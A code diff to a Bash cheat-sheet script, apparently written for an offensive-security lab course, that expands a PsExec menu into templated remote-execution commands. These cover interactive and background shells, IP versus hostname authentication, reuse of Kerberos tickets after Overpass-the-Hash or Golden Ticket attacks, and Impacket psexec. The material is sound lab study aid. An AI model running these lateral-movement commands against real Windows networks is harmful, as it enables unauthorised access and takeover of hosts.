@@ -42,10 +42,10 @@ info()    { echo -e "  ${LB}[*]${NC} $1"; }
 ok()      { echo -e "  ${LG}[+]${NC} $1"; }
 warn()    { echo -e "  ${Y}[!]${NC} $1"; }
 step()    { echo -e "\n  ${W}${BOLD}▶ $1${NC}"; }
-kali()    { echo -e "  ${LG}${BOLD}kali\$${NC}  ${BOLD}$1${NC}"; }
-win()     { echo -e "  ${LY}${BOLD}CMD>${NC}   ${BOLD}$1${NC}"; }
-ps()      { echo -e "  ${M}${BOLD}PS>${NC}    ${BOLD}$1${NC}"; }
-mimi()    { echo -e "  ${R}${BOLD}mimikatz#${NC} ${BOLD}$1${NC}"; }
+kali()    { printf "  ${LG}${BOLD}kali\$${NC}  ${BOLD}%s${NC}\n" "$1"; }
+win()     { printf "  ${LY}${BOLD}CMD>  ${NC} ${BOLD}%s${NC}\n" "$1"; }
+ps()      { printf "  ${M}${BOLD}PS>   ${NC} ${BOLD}%s${NC}\n" "$1"; }
+mimi()    { printf "  ${R}${BOLD}mimikatz#${NC} ${BOLD}%s${NC}\n" "$1"; }
 note()    { echo -e "  ${DIM}  ↳ $1${NC}"; }
 div()     { echo -e "  ${DIM}  ─────────────────────────────────────────${NC}"; }
 pause()   { echo ""; read -p "$(echo -e "  ${DIM}[Enter to continue]${NC} ")" _; }
@@ -244,11 +244,45 @@ menu_psexec() {
         local dp="${DOMAIN:+${DOMAIN}/}"
         local wp="${DOMAIN:+${DOMAIN}\\\\}"
         case $c in
-        1)  sec "Sysinternals PsExec64"
-            note "Requires: PsExec64.exe on the pivot machine"
-            win ".\\PsExec64.exe -i \\\\${TARGET_HOST:-$TARGET_IP} -u ${wp}${USERNAME} -p ${PASSWORD} cmd"
+        1)  sec "Sysinternals PsExec64 — All Options"
+            note "Location on lab machines: C:\\Tools\\SysinternalsSuite\\"
+            note "Requires: Local Admin + ADMIN\$ share + File/Printer Sharing"
+            echo ""
+
+            step "A) Interactive session with -i flag (module exact syntax):"
+            win ".\\PsExec64.exe -i \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
+            note "-i = interactive session (required for GUI/interactive cmds)"
+            note "target = hostname with \\\\ prefix (e.g. \\\\FILES04)"
             div
-            note "Answer to lab Q: ADMIN\$ share must be available"
+
+            step "B) Without -i (background/non-interactive):"
+            win ".\\PsExec64.exe \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
+            div
+
+            step "C) Using IP instead of hostname:"
+            win ".\\PsExec64.exe \\\\${TARGET_IP} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd"
+            note "IP uses NTLM auth | Hostname uses Kerberos if tickets cached"
+            div
+
+            step "D) Using already-cached Kerberos ticket (no creds needed):"
+            win ".\\PsExec.exe \\\\${TARGET_HOST:-files04} cmd"
+            note "Works after Overpass-the-Hash / Golden Ticket injection"
+            note "MUST use hostname not IP — IP forces NTLM and breaks Kerberos"
+            div
+
+            step "E) Run specific command (not interactive shell):"
+            win ".\\PsExec64.exe -i \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} powershell"
+            win ".\\PsExec64.exe \\\\${TARGET_HOST:-FILES04} -u ${DOMAIN:-corp}\\${USERNAME} -p ${PASSWORD} cmd /c \"whoami & hostname\""
+            div
+
+            step "F) What PsExec does under the hood:"
+            note "1. Writes psexesvc.exe into C:\\Windows\\ on target"
+            note "2. Creates + starts a service on remote host"
+            note "3. Runs your command as child of psexesvc.exe"
+            note "4. Communicates via named pipes over SMB"
+            div
+
+            warn "Answer to lab Q: ADMIN\$ share must be available"
             ;;
         2)  sec "Impacket psexec — Kali"
             kali "impacket-psexec ${dp}${USERNAME}:'${PASSWORD}'@${TARGET_IP}"
